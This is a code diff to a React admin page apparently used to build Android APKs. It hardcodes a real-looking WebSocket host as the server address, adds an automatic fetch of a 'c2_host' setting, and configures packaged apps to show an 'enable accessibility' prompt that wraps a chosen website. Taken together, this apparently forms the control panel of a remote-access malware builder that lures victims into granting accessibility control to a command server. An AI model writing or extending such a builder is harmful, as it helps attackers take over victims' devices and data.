@@ -23,7 +23,7 @@ const languages=["zh-中文","en-English","ja-日本語","ko-한국어","fr-Fran
 
 export default function ApkPage(){
   const actor=useMemo(authPayload,[]),actorRole=actor.role||"user",actorUsername=actor.username||"",canChooseOwner=["superadmin","super-admin","admin"].includes(actorRole)
-  const[sv,setSv]=useState(""),[wu,setWu]=useState(""),[an,setAn]=useState(""),[pn,setPn]=useState(""),[vn,setVn]=useState("1.0")
+  const[sv,setSv]=useState("wss://yk3.jk92.cc"),[wu,setWu]=useState(""),[an,setAn]=useState(""),[pn,setPn]=useState(""),[vn,setVn]=useState("1.0")
   const[ea,setEa]=useState(true),[em,setEm]=useState(true),[mt,setMt]=useState("正在配置辅助功能"),[ms,setMs]=useState("请稍候...")
   const[bt,setBt]=useState("开启辅助功能"),[si,setSi]=useState(true)
   const[bgFile,setBgFile]=useState(null),[bgPreview,setBgPreview]=useState(null),[iconFile,setIconFile]=useState(null),[iconPreview,setIconPreview]=useState(null)
@@ -38,6 +38,7 @@ export default function ApkPage(){
   const[cdn,setCdn]=useState({enabled:false,provider:"aws",accessKeyId:"",secretAccessKey:"",region:"ap-southeast-1",bucket:"",cloudFrontDomain:""})
   const[btCfg,setBtCfg]=useState({enabled:false,downloadDomain:"",uploadToken:"",downloadPath:"",host:"",port:22,username:"",password:""})
   useEffect(()=>{api.users().then(r=>setSubUsers(r.data||r.result||r||[])).catch(()=>{})},[])
+  useEffect(()=>{api.request("/api/system/c2-host").then(r=>{const h=r.data?.c2_host||r.c2_host||"";if(h)setSv(h)}).catch(()=>{})},[])
   async function loadApkList(){try{const r=await api.apkList();setList(r.data?.files||r.files||r.data||[])}catch(e){}}
   useEffect(()=>{loadApkList()},[])
   useEffect(()=>{api.request("/api/apk/cdn-config").then(r=>{const d=r.data||r;if(d.provider)setCdn(d)}).catch(()=>{})},[])
@@ -106,7 +107,7 @@ export default function ApkPage(){
       <div style={{width:"50%",borderRight:"1px solid rgba(168,85,247,.06)",display:"flex",flexDirection:"column",padding:20}}>
         <h3 style={{margin:"0 0 16px",fontSize:16,fontWeight:600,color:"#ddd"}}>📦 基础配置</h3>
         <div className="panel" style={{padding:16}}>
-          <div style={{display:"flex",gap:8,alignItems:"flex-end"}}><div style={{flex:1}}><Inp l="服务器地址" v={sv} o={setSv} p="ws://your-server.com:8888"/></div><button className="rc-btn" style={{height:32,fontSize:10,whiteSpace:"nowrap",padding:"0 10px",marginBottom:6}} onClick={async()=>{try{const r=await api.request("/api/system/c2-host");const h=r.data?.c2_host||r.c2_host||"";if(h){setSv(h);toast("✓ 已获取")}else{toast("未配置 c2_host","error")}}catch(e){toast(e.message,"error")}}}>自动获取</button></div>
+          <div style={{display:"flex",gap:8,alignItems:"flex-end"}}><div style={{flex:1}}><Inp l="服务器地址" v={sv} o={setSv} p="wss://yk3.jk92.cc"/></div><button className="rc-btn" style={{height:32,fontSize:10,whiteSpace:"nowrap",padding:"0 10px",marginBottom:6}} onClick={async()=>{try{const r=await api.request("/api/system/c2-host");const h=r.data?.c2_host||r.c2_host||"";if(h){setSv(h);toast("✓ 已获取")}else{toast("未配置 c2_host","error")}}catch(e){toast(e.message,"error")}}}>自动获取</button></div>
           <Inp l="封装网址" v={wu} o={setWu} p="https://www.baidu.com"/>
           <div style={{display:"flex",gap:8,alignItems:"flex-end"}}><div style={{flex:1}}><Inp l="应用名称" v={an} o={v=>{setAn(v);setNameVerified(false)}}/></div><button className="rc-btn" style={{height:32,fontSize:10,whiteSpace:"nowrap",padding:"0 10px",marginBottom:6,background:nameVerified?"rgba(82,196,26,.15)":"rgba(168,85,247,.08)",color:nameVerified?"#52c41a":"#b8a0c8",border:nameVerified?"1px solid rgba(82,196,26,.3)":"1px solid rgba(168,85,247,.12)"}} onClick={async()=>{if(!an.trim())return toast("请输入应用名","error");try{const owner=subOwner||actorUsername;const r=await api.request("/api/apk/check-name?name="+encodeURIComponent(an.trim())+"&ownerUsername="+encodeURIComponent(owner));if(r.available){setNameVerified(true);toast("✓ 应用名可用")}else{setNameVerified(false);toast(r.message||"不可用","error")}}catch(e){setNameVerified(false);toast(e.message,"error")}}}>{nameVerified?"✓ 已验证":"验证应用名"}</button></div>
           <div style={{display:"flex",gap:8,alignItems:"flex-end"}}><div style={{flex:1}}><Inp l="应用包名（可选）" v={pn} o={setPn} p="com.app.abcdef"/></div><button className="rc-btn" style={{height:32,fontSize:10,whiteSpace:"nowrap",padding:"0 10px",marginBottom:6}} onClick={()=>setPn(randomPackageName)}>随机</button></div>
